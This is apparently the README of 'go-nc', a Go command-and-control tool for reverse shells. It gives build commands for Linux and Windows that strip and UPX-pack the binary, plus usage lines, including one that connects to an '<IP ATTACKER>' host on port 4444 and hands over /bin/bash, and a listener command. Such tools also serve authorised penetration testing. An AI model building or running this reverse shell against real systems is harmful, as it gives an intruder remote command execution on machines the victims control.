# go-nc
Simple Command & Control for revshells in pure Go

# Build

### For Linux
```bash
git clone https://github.com/vay3t/go-nc
cd go-nc
go build -ldflags "-s -w" go-nc.go
upx go-nc
```

```
-rwxr-xr-x 1 vay3t vay3t 685K Jul 15 00:21 go-nc
```

### For Windows
```bash
git clone https://github.com/vay3t/go-nc
cd go-nc
GOOS=windows GOARCH=amd64 go build -ldflags "-s -w" go-nc.go
upx go-nc.exe
```

```
-rwxr-xr-x 1 vay3t vay3t 825K Jul 15 00:30 go-nc.exe
```

# Usage

### Reverse shell
```bash
./go-nc -host <IP ATTACKER> -port 4444 -exec /bin/bash
```

### Server
```bash
./go-nc -listen
```
